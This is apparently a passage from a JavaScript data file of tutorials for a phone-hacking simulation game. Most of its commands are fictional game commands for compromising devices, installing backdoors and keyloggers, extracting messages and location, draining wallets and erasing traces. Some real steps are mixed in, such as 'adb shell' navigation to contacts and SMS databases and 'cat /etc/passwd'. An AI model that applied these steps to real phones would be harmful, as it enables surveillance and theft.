        'STAGE 2 - Initial Access:',
        '  4. Try Bluetooth: bt exploit <MAC> (in your terminal)',
        '  5. If fails, try Network: hack-device <IP>',
        '  6. If fails, try Direct: exploit shell (in target terminal)',
        '',
        'STAGE 3 - Persistence:',
        '  7. Once compromised: exploit backdoor',
        '  8. Install keylogger: exploit keylogger',
        '',
        'STAGE 4 - Data Extraction:',
        '  9. Extract contacts: exploit contacts',
        '  10. Extract photos: exploit photos',
        '  11. Access files: exploit files',
        '  12. Track location: exploit location',
        '',
        'Success rate: 30-50% on high security devices'
      ],
      actions: []
    },
    tutorial_os_security_impact: {
      id: 'attack_tutorial_os',
      name: 'Tutorial: OS Version Impact on Attacks',
      description: 'Learn how OS version affects attack success rates. Lower API = easier to exploit.',
      category: 'deviceAttacks',
      instructions: [
        'OS Security Levels:',
        '',
        'Android 9.0 (API 28) - Basic Security:',
        '  - Success Rate: 80-90%',
        '  - Easy to exploit',
        '  - Use: exploit shell, bt exploit',
        '',
        'Android 10-11 (API 29-30) - Enhanced:',
        '  - Success Rate: 60-80%',
        '  - Medium difficulty',
        '  - May need multiple attempts',
        '',
        'Android 12-12L (API 31-32) - Advanced:',
        '  - Success Rate: 40-60%',
        '  - Harder to exploit',
        '  - Requires multi-stage attacks',
        '',
        'Android 13+ (API 33+) - Maximum:',
        '  - Success Rate: 10-40%',
        '  - Very hard to exploit',
        '  - Requires advanced techniques',
        '',
        'Tip: Always check OS version before attacking!'
      ],
      actions: []
    },
    scenario_attack_weak_android: {
      id: 'attack_scenario_weak_android',
      name: 'Scenario: Attack Weak Android Device',
      description: 'Complete scenario: Discover and attack a weak Android device (Security 3, Android 9). Step-by-step guide.',
      category: 'deviceAttacks',
      instructions: [
        'STEP 1 - Discovery:',
        '  1. Go to /attack page',
        '  2. Click "Scan All"',
        '  3. Find device: "Corporate Device" (Security: 3, Android 9)',
        '',
        'STEP 2 - Attack:',
        '  4. Click on "Corporate Device" card',
        '  5. Click "Terminal Only" button',
        '  6. In target terminal, type: exploit shell',
        '',
        'STEP 3 - Verify:',
        '  7. Wait 2 seconds',
        '  8. Device should show "COMPROMISED" (green)',
        '  9. Success rate: ~85% for this device',
        '',
        'STEP 4 - Extract Data:',
        '  10. Type: exploit contacts',
        '  11. Type: exploit photos',
        '  12. Type: exploit files',
        '',
        'Expected Result: Device compromised, data extracted'
      ],
      actions: []
    },
    scenario_attack_medium_security: {
      id: 'attack_scenario_medium',
      name: 'Scenario: Attack Medium Security Device',
      description: 'Complete scenario: Attack device with medium security (Security 6, Android 12). Requires multiple attempts.',
      category: 'deviceAttacks',
      instructions: [
        'STEP 1 - Discovery:',
        '  1. Go to /attack page',
        '  2. Click "Scan Bluetooth"',
        '  3. Find: "Samsung Galaxy S21" (Security: 6, Android 12)',
        '',
        'STEP 2 - Initial Attack:',
        '  4. Click "Attack Device" (full interface)',
        '  5. In YOUR terminal (left), type: bt exploit AA:BB:CC:DD:EE:02',
        '  6. If fails, try in TARGET terminal: exploit shell',
        '',
        'STEP 3 - Alternative Method:',
        '  7. If both fail, note device IP (if shown)',
        '  8. In YOUR terminal: hack-device <IP>',
        '',
        'STEP 4 - Persistence:',
        '  9. Once compromised: exploit backdoor',
        '  10. Install keylogger: exploit keylogger',
        '',
        'Expected Result: 50-70% success rate, may need 2-3 attempts'
      ],
      actions: []
    },
    scenario_attack_high_security: {
      id: 'attack_scenario_high',
      name: 'Scenario: Attack High Security Device (Expert)',
      description: 'Complete scenario: Attack high-security device (Security 8+, Android 13+). Advanced multi-stage attack.',
      category: 'deviceAttacks',
      instructions: [
        'STEP 1 - Target Selection:',
        '  1. Go to /attack page',
        '  2. Click "Scan All"',
        '  3. Find: "iPhone 13 Pro" (Security: 8, iOS 16.5)',
        '',
        'STEP 2 - Multi-Method Attack:',
        '  4. Click "Attack Device"',
        '  5. Try Method 1 - Bluetooth: bt exploit <MAC>',
        '  6. If fails, try Method 2 - Direct: exploit shell',
        '  7. If fails, try Method 3 - Network: hack-device <IP>',
        '',
        'STEP 3 - Persistence (if any method succeeds):',
        '  8. exploit backdoor',
        '  9. exploit keylogger',
        '',
        'STEP 4 - Data Extraction:',
        '  10. exploit contacts',
        '  11. exploit photos',
        '  12. exploit location',
        '',
        'Expected Result: 20-40% success rate, requires patience'
      ],
      actions: []
    },
    terminal_bluetooth_scan_attack: {
      id: 'terminal_bt_scan_attack',
      name: 'Terminal: Bluetooth Scan & Attack',
      description: 'Complete terminal-based attack: Scan Bluetooth, find devices, and exploit via terminal commands.',
      category: 'deviceAttacks',
      instructions: [
        'STEP 1 - Initial Scan:',
        '  1. Open terminal (in Attack Scenario or Phone page)',
        '  2. Type: bt scan',
        '  3. Wait for scan to complete',
        '  4. Review discovered devices',
        '',
        'STEP 2 - List Discovered Devices:',
        '  5. Type: bt list',
        '  6. Note device MAC addresses',
        '  7. Identify target device',
        '  8. Check device security level',
        '',
        'STEP 3 - Target Selection:',
        '  • Look for devices with Security 1-5 (easier)',
        '  • Note the MAC address (e.g., AA:BB:CC:DD:EE:01)',
        '  • Check if device is "vulnerable"',
        '',
        'STEP 4 - Bluetooth Exploit:',
        '  9. Type: bt exploit <MAC_ADDRESS>',
        '  Example: bt exploit AA:BB:CC:DD:EE:01',
        '  10. Wait for exploit to execute',
        '  11. Check if device shows "COMPROMISED"',
        '',
        'STEP 5 - Verify Access:',
        '  12. If successful, device status changes',
        '  13. You now have Bluetooth access',
        '  14. Proceed to data extraction',
        '',
        'Tip: Lower security devices have higher success rates!'
      ],
      actions: []
    },
    terminal_network_discovery_attack: {
      id: 'terminal_network_attack',
      name: 'Terminal: Network Discovery & Attack',
      description: 'Discover devices on network via terminal, then attack using IP-based commands.',
      category: 'deviceAttacks',
      instructions: [
        'STEP 1 - Network Scanning:',
        '  1. In terminal, type: wifi scan',
        '  2. Or use: nmcli device wifi list',
        '  3. Review network devices',
        '  4. Note IP addresses',
        '',
        'STEP 2 - Identify Targets:',
        '  5. Look for devices with IP addresses',
        '  6. Check device security levels',
        '  7. Note vulnerable devices',
        '  8. Example IP: 192.168.1.105',
        '',
        'STEP 3 - Network Attack:',
        '  9. Type: hack-device <IP_ADDRESS>',
        '  Example: hack-device 192.168.1.105',
        '  10. System scans for vulnerabilities',
        '  11. Automatically attempts exploits',
        '  12. Wait for results',
        '',
        'STEP 4 - Verify Compromise:',
        '  13. Check device status',
        '  14. If "COMPROMISED", proceed',
        '  15. If failed, try different method',
        '',
        'STEP 5 - Post-Exploitation:',
        '  16. Access target terminal',
        '  17. Use exploit commands',
        '  18. Extract data',
        '',
        'Tip: Network attacks work best on devices with open ports!'
      ],
      actions: []
    },
    terminal_brute_force_pin: {
      id: 'terminal_brute_force_pin',
      name: 'Terminal: Brute Force PIN Attack',
      description: 'Learn how to brute force device PINs using terminal commands. Step-by-step PIN cracking.',
      category: 'deviceAttacks',
      instructions: [
        'STEP 1 - Target Selection:',
        '  1. Scan for devices: bt scan or wifi scan',
        '  2. Select locked device',
        '  3. Note device security level',
        '  4. Lower security = Higher success',
        '',
        'STEP 2 - Access Target Terminal:',
        '  5. Click "Terminal Only" on target device',
        '  6. Or use "Attack Device" for full interface',
        '  7. Wait for terminal to load',
        '',
        'STEP 3 - Brute Force Attack:',
        '  8. In TARGET terminal, type: crack-pin',
        '  9. System starts brute force attempt',
        '  10. Shows progress (may take time)',
        '  11. Tries common PIN combinations',
        '',
        'STEP 4 - Common PIN Patterns:',
        '  • 0000, 1111, 1234, 4321',
        '  • 2580 (keypad pattern)',
        '  • Birth years, dates',
        '  • Sequential numbers',
        '',
        'STEP 5 - Success Indicators:',
        '  12. If successful: Device unlocks',
        '  13. Status changes to "COMPROMISED"',
        '  14. You can now access device',
        '  15. If failed: Device may lock',
        '',
        'STEP 6 - Alternative Methods:',
        '  • Try exploit shell first',
        '  • Use other attack vectors',
        '  • Combine with other methods',
        '',
        'Warning: Brute force may lock device after failed attempts!'
      ],
      actions: []
    },
    terminal_shell_exploitation: {
      id: 'terminal_shell_exploit',
      name: 'Terminal: Shell Exploitation',
      description: 'Gain shell access to target device using terminal exploit commands.',
      category: 'deviceAttacks',
      instructions: [
        'STEP 1 - Target Preparation:',
        '  1. Scan and select target device',
        '  2. Click "Terminal Only" or "Attack Device"',
        '  3. Access target device terminal',
        '  4. Note device security level',
        '',
        'STEP 2 - Direct Shell Exploit:',
        '  5. In TARGET terminal, type: exploit shell',
        '  6. Wait 2-3 seconds for execution',
        '  7. System attempts to gain root access',
        '  8. Success depends on security level',
        '',
        'STEP 3 - Success Rates:',
        '  • Security 1-3: 80-90% success',
        '  • Security 4-6: 50-70% success',
        '  • Security 7-8: 30-50% success',
        '  • Security 9-10: 10-30% success',
        '',
        'STEP 4 - Verify Access:',
        '  9. Check device status',
        '  10. If "COMPROMISED", you have shell',
        '  11. If failed, try alternative methods',
        '  12. May need multiple attempts',
        '',
        'STEP 5 - Using Shell Access:',
        '  13. Once compromised, use commands:',
        '  • exploit contacts - Extract contacts',
        '  • exploit photos - Download photos',
        '  • exploit files - Access file system',
        '  • exploit sms - Intercept messages',
        '',
        'Tip: Shell access gives you full control of the device!'
      ],
      actions: []
    },
    terminal_adb_shell_access: {
      id: 'terminal_adb_shell',
      name: 'Terminal: ADB Shell Access',
      description: 'Use ADB (Android Debug Bridge) to gain shell access and navigate device filesystem.',
      category: 'deviceAttacks',
      instructions: [
        'STEP 1 - Check Connected Devices:',
        '  1. In YOUR terminal, type: adb devices',
        '  2. List all connected devices',
        '  3. Note device ID or IP',
        '  4. Verify device is connected',
        '',
        'STEP 2 - Enter ADB Shell:',
        '  5. Type: adb shell',
        '  6. Prompt changes to: shell@android:/ $',
        '  7. You are now in Android shell',
        '  8. Can execute Linux commands',
        '',
        'STEP 3 - Navigate Filesystem:',
        '  9. Type: ls (list files)',
        '  10. Type: cd /sdcard (go to storage)',
        '  11. Type: cd /data/data (app data)',
        '  12. Type: cd /system (system files)',
        '',
        'STEP 4 - Explore Directories:',
        '  13. Type: ls -la (detailed list)',
        '  14. Type: pwd (current directory)',
        '  15. Type: cat <file> (view file)',
        '  16. Type: cd .. (go back)',
        '',
        'STEP 5 - Access Sensitive Data:',
        '  17. Navigate to /sdcard/DCIM (photos)',
        '  18. Navigate to /data/data/com.android.providers.contacts (contacts)',
        '  19. Navigate to /data/data/com.android.providers.telephony (SMS)',
        '  20. Use cat to view files',
        '',
        'STEP 6 - Exit Shell:',
        '  21. Type: exit',
        '  22. Returns to normal terminal',
        '',
        'Tip: ADB shell gives you deep filesystem access!'
      ],
      actions: []
    },
    terminal_multi_stage_attack: {
      id: 'terminal_multi_stage',
      name: 'Terminal: Multi-Stage Attack Sequence',
      description: 'Complete terminal attack chain: Scan → Identify → Exploit → Persist → Extract. Full workflow.',
      category: 'deviceAttacks',
      instructions: [
        'STAGE 1 - RECONNAISSANCE:',
        '  Command: bt scan',
        '  • In YOUR terminal, type: bt scan',
        '  • Press Enter, wait 3-5 seconds',
        '  Command: bt list',
        '  • Type: bt list',
        '  • Press Enter',
        '  • Review discovered devices',
        '  • Note MAC addresses and security levels',
        '',
        'STAGE 2 - TARGET SELECTION:',
        '  • Choose device with Security 1-5',
        '  • Note MAC: AA:BB:CC:DD:EE:02',
        '  • Or note IP: 192.168.1.105',
        '  • Identify best attack vector',
        '',
        'STAGE 3 - INITIAL ACCESS (Method 1 - Bluetooth):',
        '  Command: bt exploit <MAC>',
        '  • Type: bt exploit AA:BB:CC:DD:EE:02',
        '  • Press Enter',
        '  • Wait for exploit',
        '  • If successful, proceed to Stage 4',
        '',
        'STAGE 4 - ALTERNATIVE ACCESS (Method 2 - Network):',
        '  Command: hack-device <IP>',
        '  • If Bluetooth failed, type: hack-device 192.168.1.105',
        '  • Press Enter',
        '  • System scans and exploits',
        '  • Wait for completion',
        '',
        'STAGE 5 - DIRECT ACCESS (Method 3 - Shell):',
        '  Command: exploit shell',
        '  • If network failed, in TARGET terminal:',
        '  • Type: exploit shell',
        '  • Press Enter',
        '  • Direct shell exploit',
        '  • In tutorial: Always succeeds!',
        '',
        'STAGE 6 - VERIFY COMPROMISE:',
        '  • Check target device status',
        '  • Should show "COMPROMISED" (green)',
        '  • One method should have succeeded',
        '  • Proceed to persistence',
        '',
        'STAGE 7 - INSTALL PERSISTENCE:',
        '  Command: exploit backdoor',
        '  • In TARGET terminal, type: exploit backdoor',
        '  • Press Enter',
        '  • Output: "Persistent backdoor installed"',
        '  Command: exploit keylogger',
        '  • Type: exploit keylogger',
        '  • Press Enter',
        '  • Output: "Keylogger installed and active"',
        '',
        'STAGE 8 - DATA EXTRACTION:',
        '  Command: exploit contacts',
        '  • Type: exploit contacts',
        '  • Press Enter',
        '  • Extracts all contacts',
        '  Command: exploit photos',
        '  • Type: exploit photos',
        '  • Press Enter',
        '  • Downloads all photos',
        '  Command: exploit files',
        '  • Type: exploit files',
        '  • Press Enter',
        '  • Accesses file system',
        '',
        'STAGE 9 - COMPLETE EXTRACTION:',
        '  Command: exploit sms',
        '  • Type: exploit sms',
        '  • Press Enter',
        '  • Intercepts messages',
        '  Command: exploit location',
        '  • Type: exploit location',
        '  • Press Enter',
        '  • Tracks GPS position',
        '',
        'STAGE 10 - MAINTAIN ACCESS:',
        '  • Backdoor ensures re-access',
        '  • Keylogger provides credentials',
        '  • Monitor device activity',
        '  • Access persists after reboot',
        '',
        'Tip: Multi-stage attacks ensure success even if one method fails!'
      ],
      actions: []
    },
    terminal_password_cracking: {
      id: 'terminal_password_crack',
      name: 'Terminal: Password Cracking',
      description: 'Learn terminal-based password cracking techniques and brute force methods.',
      category: 'deviceAttacks',
      instructions: [
        'STEP 1 - Target Identification:',
        '  1. Scan for devices: bt scan or wifi scan',
        '  2. Identify device with password protection',
        '  3. Note device type and OS',
        '  4. Check security level',
        '',
        'STEP 2 - Hash Extraction:',
        '  5. If device compromised, access filesystem',
        '  6. Use: adb shell',
        '  7. Navigate to: /data/system/',
        '  8. Extract password hashes',
        '',
        'STEP 3 - Hash Analysis:',
        '  9. Identify hash type (MD5, SHA1, etc.)',
        '  10. Use: cat password.hash',
        '  11. Note hash format',
        '  12. Determine cracking method',
        '',
        'STEP 4 - Brute Force Attack:',
        '  13. Use terminal: crack-pin (for PINs)',
        '  14. Or: exploit password <hash>',
        '  15. System attempts common passwords',
        '  16. Shows progress',
        '',
        'STEP 5 - Dictionary Attack:',
        '  • Common passwords: 123456, password, admin',
        '  • Pattern-based: dates, names, words',
        '  • Custom wordlists if available',
        '',
        'STEP 6 - Success:',
        '  17. If successful, password revealed',
        '  18. Use password to access device',
        '  19. Change device password if persistent',
        '',
        'Tip: Lower security = Faster cracking!'
      ],
      actions: []
    },
    terminal_wifi_attack: {
      id: 'terminal_wifi_attack',
      name: 'Terminal: WiFi Network Attack',
      description: 'Attack devices via WiFi network using terminal commands. Complete WiFi-based exploitation.',
      category: 'deviceAttacks',
      instructions: [
        'STEP 1 - Scan WiFi Networks:',
        '  Command: wifi scan',
        '  • In YOUR terminal, type: wifi scan',
        '  • Press Enter',
        '  • Output shows available WiFi networks',
        '  • Lists network names and security',
        '',
        'STEP 2 - Alternative WiFi Scan:',
        '  Command: nmcli device wifi list',
        '  • Type: nmcli device wifi list',
        '  • Press Enter',
        '  • Detailed network information',
        '  • Shows: SSID, Security, Signal, etc.',
        '',
        'STEP 3 - Analyze Networks:',
        '  • Review network list',
        '  • Check encryption: WPA2, WPA3, Open',
        '  • Note signal strength',
        '  • Identify target network',
        '',
        'STEP 4 - Discover Network Devices:',
        '  Command: hack-device <network_range>',
        '  • Type: hack-device 192.168.1.0',
        '  • Press Enter',
        '  • Scans entire network range',
        '  • Lists all devices on network',
        '',
        'STEP 5 - Identify Target:',
        '  • Review discovered devices',
        '  • Note IP addresses',
        '  • Check device security levels',
        '  • Select target (e.g., 192.168.1.105)',
        '',
        'STEP 6 - Execute Network Attack:',
        '  Command: hack-device <target_ip>',
        '  • Type: hack-device 192.168.1.105',
        '  • Replace with actual target IP',
        '  • Press Enter',
        '  • Output: "Scanning for vulnerabilities..."',
        '',
        'STEP 7 - Vulnerability Scan:',
        '  • Output shows found vulnerabilities:',
        '    - Open port 5555 (ADB)',
        '    - Weak authentication',
        '    - Outdated libraries',
        '  • Wait for scan completion',
        '',
        'STEP 8 - Exploit Execution:',
        '  • Output: "Exploiting vulnerabilities..."',
        '  • System attempts automatic exploit',
        '  • Wait 2-3 seconds',
        '  • Result: "Device compromised!"',
        '',
        'STEP 9 - Verify Access:',
        '  • Check target device status',
        '  • Should show "COMPROMISED"',
        '  • You have network access',
        '  • Can access target terminal',
        '',
        'STEP 10 - Post-Exploitation:',
        '  Command: exploit shell',
        '  • In TARGET terminal: exploit shell',
        '  • Gain root access',
        '  • Extract data as needed',
        '',
        'Tip: WiFi attacks work on devices connected to same network!'
      ],
      actions: []
    },
    terminal_automated_attack: {
      id: 'terminal_automated',
      name: 'Terminal: Automated Attack Script',
      description: 'Learn to chain terminal commands for automated attack sequences.',
      category: 'deviceAttacks',
      instructions: [
        'STEP 1 - Attack Planning:',
        '  1. Identify target type',
        '  2. Plan attack sequence',
        '  3. Prepare command chain',
        '  4. Have backup methods ready',
        '',
        'STEP 2 - Automated Scan:',
        '  5. Type: bt scan && bt list',
        '  6. Or: wifi scan && hack-device <ip>',
        '  7. Chain commands with &&',
        '  8. Automate discovery phase',
        '',
        'STEP 3 - Multi-Vector Attack:',
        '  9. Try Bluetooth: bt exploit <mac>',
        '  10. If fails, try Network: hack-device <ip>',
        '  11. If fails, try Direct: exploit shell',
        '  12. Automate fallback methods',
        '',
        'STEP 4 - Automated Exploitation:',
        '  13. Once compromised:',
        '  exploit backdoor && exploit keylogger',
        '  14. Chain persistence commands',
        '  15. Automate data extraction',
        '',
        'STEP 5 - Data Extraction Chain:',
        '  16. exploit contacts && exploit photos && exploit files',
        '  17. Extract all data in sequence',
        '  18. Log all results',
        '',
        'Tip: Command chaining speeds up attacks!'
      ],
      actions: []
    },
    terminal_privilege_escalation: {
      id: 'terminal_privilege_escalation',
      name: 'Terminal: Privilege Escalation',
      description: 'Learn how to escalate privileges from basic access to root/admin level.',
      category: 'deviceAttacks',
      instructions: [
        'STEP 1 - Initial Access:',
        '  1. Gain basic shell access: exploit shell',
        '  2. Verify current privilege level',
        '  3. Type: whoami',
        '  4. Check current user',
        '',
        'STEP 2 - System Information:',
        '  5. Type: uname -a (system info)',
        '  6. Type: cat /etc/passwd (users)',
        '  7. Type: ls -la / (root directory)',
        '  8. Identify escalation vectors',
        '',
        'STEP 3 - Exploit Vulnerabilities:',
        '  9. Check for SUID binaries',
        '  10. Look for misconfigurations',
        '  11. Find writable directories',
        '  12. Identify vulnerable services',
        '',
        'STEP 4 - Escalation Methods:',
        '  13. Use: exploit root',
        '  14. Or: exploit privilege',
        '  15. Attempt to gain root access',
        '  16. May require multiple attempts',
        '',
        'STEP 5 - Verify Root Access:',
        '  17. Type: whoami (should show root)',
        '  18. Type: id (check UID)',
        '  19. Access restricted directories',
        '  20. Full system control achieved',
        '',
        'Tip: Root access gives you complete device control!'
      ],
      actions: []
    },
    terminal_data_exfiltration: {
      id: 'terminal_data_exfil',
      name: 'Terminal: Data Exfiltration',
      description: 'Extract and exfiltrate data from compromised device using terminal commands.',
      category: 'deviceAttacks',
      instructions: [
        'STEP 1 - Verify Access:',
        '  1. Ensure device is compromised',
        '  2. Access target device terminal',
        '  3. Verify shell access',
        '  4. Check current directory',
        '',
        'STEP 2 - Contact Extraction:',
        '  5. Type: exploit contacts',
        '  6. System extracts all contacts',
        '  7. Downloads contact database',
        '  8. Saves to your device',
        '',
        'STEP 3 - Photo Extraction:',
        '  9. Type: exploit photos',
        '  10. Downloads all photos',
        '  11. Accesses /sdcard/DCIM',
        '  12. Transfers to your device',
        '',
        'STEP 4 - File System Access:',
        '  13. Type: exploit files',
        '  14. Or use: adb shell',
        '  15. Navigate: cd /sdcard',
        '  16. Browse and download files',
        '',
        'STEP 5 - SMS Extraction:',
        '  17. Type: exploit sms',
        '  18. Extracts all messages',
        '  19. Downloads message database',
        '  20. Includes sender, content, timestamps',
        '',
        'STEP 6 - Location Tracking:',
        '  21. Type: exploit location',
        '  22. Gets GPS coordinates',
        '  23. Tracks device movement',
        '  24. Real-time location data',
        '',
        'STEP 7 - Complete Extraction:',
        '  25. Chain commands:',
        '  exploit contacts && exploit photos && exploit files',
        '  26. Extract all data at once',
        '  27. Verify data received',
        '',
        'Tip: Extract data quickly before device is secured!'
      ],
      actions: []
    },
    terminal_persistence_installation: {
      id: 'terminal_persistence',
      name: 'Terminal: Install Persistence',
      description: 'Install backdoors and keyloggers for persistent access using terminal commands.',
      category: 'deviceAttacks',
      instructions: [
        'STEP 1 - Initial Compromise:',
        '  1. Gain shell access: exploit shell',
        '  2. Verify device is compromised',
        '  3. Check access level',
        '  4. Ensure stable connection',
        '',
        'STEP 2 - Backdoor Installation:',
        '  5. In TARGET terminal: exploit backdoor',
        '  6. System installs persistent backdoor',
        '  7. Creates hidden service',
        '  8. Sets up auto-start',
        '',
        'STEP 3 - Keylogger Installation:',
        '  9. Type: exploit keylogger',
        '  10. Installs keylogging service',
        '  11. Captures all keystrokes',
        '  12. Logs to hidden file',
        '',
        'STEP 4 - Verify Installation:',
        '  13. Check running processes',
        '  14. Verify backdoor is active',
        '  15. Test keylogger functionality',
        '  16. Ensure persistence survives reboot',
        '',
        'STEP 5 - Access Maintenance:',
        '  17. Backdoor allows re-access',
        '  18. Keylogger provides credentials',
        '  19. Monitor device activity',
        '  20. Maintain long-term access',
        '',
        'STEP 6 - Stealth:',
        '  21. Hide backdoor processes',
        '  22. Use system names',
        '  23. Avoid detection',
        '  24. Monitor for security scans',
        '',
        'Tip: Persistence ensures continued access even after device restart!'
      ],
      actions: []
    },
    terminal_network_enumeration: {
      id: 'terminal_network_enum',
      name: 'Terminal: Network Enumeration',
      description: 'Enumerate network, discover services, and identify attack vectors via terminal.',
      category: 'deviceAttacks',
      instructions: [
        'STEP 1 - Network Discovery:',
        '  1. Type: wifi scan',
        '  2. Or: nmcli device wifi list',
        '  3. Identify target network',
        '  4. Note network range',
        '',
        'STEP 2 - Host Discovery:',
        '  5. Scan network: hack-device <network>',
        '  6. Or use: adb devices',
        '  7. List all devices on network',
        '  8. Identify target IPs',
        '',
        'STEP 3 - Port Scanning:',
        '  9. For each target, check ports',
        '  10. Type: exploit scan <ip>',
        '  11. Identify open ports',
        '  12. Note running services',
        '',
        'STEP 4 - Service Enumeration:',
        '  13. Identify service versions',
        '  14. Check for known vulnerabilities',
        '  15. Map attack surface',
        '  16. Prioritize targets',
        '',
        'STEP 5 - Vulnerability Assessment:',
        '  17. Check for default credentials',
        '  18. Identify outdated software',
        '  19. Find misconfigurations',
        '  20. Plan attack vectors',
        '',
        'Tip: Thorough enumeration reveals the best attack paths!'
      ],
      actions: []
    },
    terminal_remote_access: {
      id: 'terminal_remote_access',
      name: 'Terminal: Remote Access Setup',
      description: 'Set up remote access to compromised device using terminal commands.',
      category: 'deviceAttacks',
      instructions: [
        'STEP 1 - Initial Access:',
        '  1. Compromise target device',
        '  2. Gain shell access: exploit shell',
        '  3. Verify stable connection',
        '  4. Check network connectivity',
        '',
        'STEP 2 - Remote Service Setup:',
        '  5. Install remote access tool',
        '  6. Type: exploit remote',
        '  7. Configure listening port',
        '  8. Set up authentication',
        '',
        'STEP 3 - Connection Establishment:',
        '  9. Note device IP address',
        '  10. Configure port forwarding',
        '  11. Test remote connection',
        '  12. Verify access works',
        '',
        'STEP 4 - Persistent Remote Access:',
        '  13. Set up auto-start',
        '  14. Configure to survive reboot',
        '  15. Hide remote service',
        '  16. Monitor connection status',
        '',
        'STEP 5 - Using Remote Access:',
        '  17. Connect from your terminal',
        '  18. Type: connect <target_ip>',
        '  19. Access device remotely',
        '  20. Execute commands remotely',
        '',
        'Tip: Remote access allows control without physical proximity!'
      ],
      actions: []
    },
    terminal_steal_wallet_money: {
      id: 'terminal_steal_wallet',
      name: 'Terminal: Steal Money from Wallet',
      description: 'Extract money from compromised device wallet app using terminal commands. Complete wallet exploitation.',
      category: 'deviceAttacks',
      instructions: [
        'STEP 1 - Gain Device Access:',
        '  Command: exploit shell',
        '  • First, compromise target device',
        '  • In TARGET terminal, type: exploit shell',
        '  • Press Enter',
        '  • Wait for successful exploit',
        '  • Device must be compromised first',
        '',
        'STEP 2 - Access Android Shell:',
        '  Command: adb shell',
        '  • Type: adb shell',
        '  • Press Enter',
        '  • Enter Android shell environment',
        '  • Prompt changes to: shell@android:/ $',
        '',
        'STEP 3 - Navigate to Wallet App Data:',
        '  Command: cd /data/data',
        '  • Type: cd /data/data',
        '  • Press Enter',
        '  Command: ls',
        '  • Type: ls',
        '  • Find wallet app package',
        '  • Common names: com.android.wallet, com.google.wallet, etc.',
        '',
        'STEP 4 - Access Wallet Database:',
        '  Command: cd com.android.wallet',
        '  • Type: cd com.android.wallet',
        '  • Replace with actual wallet package name',
        '  • Press Enter',
        '  Command: cd databases',
        '  • Type: cd databases',
        '  • Press Enter',
        '  Command: ls',
        '  • Type: ls',
        '  • Shows wallet database files',
        '',
        'STEP 5 - Extract Wallet Data:',
        '  Command: cat wallet.db',
        '  • Type: cat wallet.db',
        '  • Press Enter',
        '  • View wallet database contents',
        '  • Contains account balances and transaction data',
        '',
        'STEP 6 - Use Exploit Command:',
        '  Command: exploit wallet',
        '  • In TARGET terminal, type: exploit wallet',
        '  • Press Enter',
        '  • Output: "Accessing wallet application..."',
        '  • System extracts wallet data',
        '',
        'STEP 7 - Extract Money:',
        '  • Output shows: "Wallet database extracted"',
        '  • Displays account balances',
        '  • Shows: Account 1: $1,234.56',
        '  • Shows: Account 2: $5,678.90',
        '  • Total funds available',
        '',
        'STEP 8 - View Purchase History:',
        '  Command: exploit purchases',
        '  • In TARGET terminal, type: exploit purchases',
        '  • Press Enter',
        '  • Output: "Purchase history extracted"',
        '  • Shows recent purchases with dates, merchants, amounts',
        '  • Displays transaction history',
        '  • Reveals spending patterns',
        '',
        'STEP 9 - Transfer Funds:',
        '  Command: exploit transfer <amount>',
        '  • Type: exploit transfer 1000',
        '  • Press Enter',
        '  • Transfers money to your account',
        '  • Output: "Transferring $1000..."',
        '  • "Transfer successful!"',
        '',
        'STEP 10 - Verify Transfer:',
        '  • Check your wallet balance',
        '  • Money should appear in your account',
        '  • Transaction logged',
        '  • Funds successfully stolen',
        '',
        'STEP 11 - Cover Tracks:',
        '  Command: exploit cleanup',
        '  • Type: exploit cleanup',
        '  • Press Enter',
        '  • Removes traces of attack',
        '  • Clears transaction logs',
        '  • Maintains stealth',
        '',
        'Tip: Wallet attacks work best on devices with payment apps installed!'
      ],
      actions: []
    }
  },

  // ============ DEFENSE TUTORIALS ============
  defense: {
    tutorial_secure_your_device: {
      id: 'defense_tutorial_secure_device',
      name: 'Tutorial: Secure Your Device',
      description: 'Learn how to protect your phone and devices from attacks. Essential defense strategies.',
      category: 'defense',
      instructions: [
        'STEP 1 - Device Security Basics:',
        '  1. Set strong PIN/password',
        '  2. Enable biometric authentication',
        '  3. Keep OS updated',
        '  4. Use secure lock screen',
        '',
        'STEP 2 - App Security:',
        '  • Review app permissions',
        '  • Only install trusted apps',
        '  • Keep apps updated',
        '  • Uninstall unused apps',
        '',
        'STEP 3 - Network Security:',
        '  • Use secure WiFi (WPA3)',
        '  • Avoid public WiFi',
        '  • Use VPN when possible',
        '  • Monitor network activity',
        '',
        'STEP 4 - Data Protection:',
        '  • Enable device encryption',
        '  • Use secure backup',
        '  • Enable remote wipe',
        '  • Regular backups',
        '',
        'STEP 5 - Attack Prevention:',
        '  • Don\'t click suspicious links',
        '  • Be wary of unknown contacts',
        '  • Monitor for unusual activity',
        '  • Report suspicious behavior',
        '',
        'Tip: Higher security level devices are much harder to compromise!'
      ],
      actions: []
    },
    tutorial_detect_attacks: {
      id: 'defense_tutorial_detect',
      name: 'Tutorial: Detect Attacks',
      description: 'Learn how to recognize when your device is under attack and what to do.',
      category: 'defense',
      instructions: [
        'STEP 1 - Attack Indicators:',
        '  • Unusual battery drain',
        '  • Slow performance',
        '  • Unexpected data usage',
        '  • Unknown apps installed',
        '',
        'STEP 2 - Monitoring:',
        '  1. Check device logs',
        '  2. Monitor network traffic',
        '  3. Review app permissions',
        '  4. Check running processes',
        '',
        'STEP 3 - Response:',
        '  • Disconnect from network',
        '  • Change all passwords',
        '  • Enable additional security',
        '  • Remove suspicious apps',
        '',
        'Tip: Early detection prevents serious damage!'
      ],
      actions: []
    },
    tutorial_password_security: {
      id: 'defense_tutorial_passwords',
      name: 'Tutorial: Password Security',
      description: 'Learn how to create, manage, and protect strong passwords.',
      category: 'defense',
      instructions: [
        'STEP 1 - Strong Passwords:',
        '  1. Use at least 12 characters',
        '  2. Include uppercase, lowercase, numbers, symbols',
        '  3. Avoid dictionary words',
        '  4. Make it unique',
        '',
        'STEP 2 - Management:',
        '  • Use password manager',
        '  • Don\'t reuse passwords',
        '  • Change regularly',
        '  • Enable 2FA',
        '',
        'Tip: Strong passwords are your first line of defense!'
      ],
      actions: []
    },
    tutorial_firewall_configuration: {
      id: 'defense_tutorial_firewall',
      name: 'Tutorial: Configure Firewall',
      description: 'Learn how to set up firewalls to protect your network and devices.',
      category: 'defense',
      instructions: [
        'STEP 1 - Firewall Basics:',
        '  • Firewalls block unauthorized access',
        '  • Control traffic flow',
        '  • First line of defense',
        '',
        'STEP 2 - Setup:',
        '  1. Enable firewall',
        '  2. Configure rules',
        '  3. Set policies',
        '  4. Test configuration',
        '',
        'Tip: Properly configured firewalls block most attacks!'
      ],
      actions: []
    }
  },

  // ============ ALLIANCE TUTORIALS ============
  alliance: {
    tutorial_join_alliance: {
      id: 'alliance_tutorial_join',
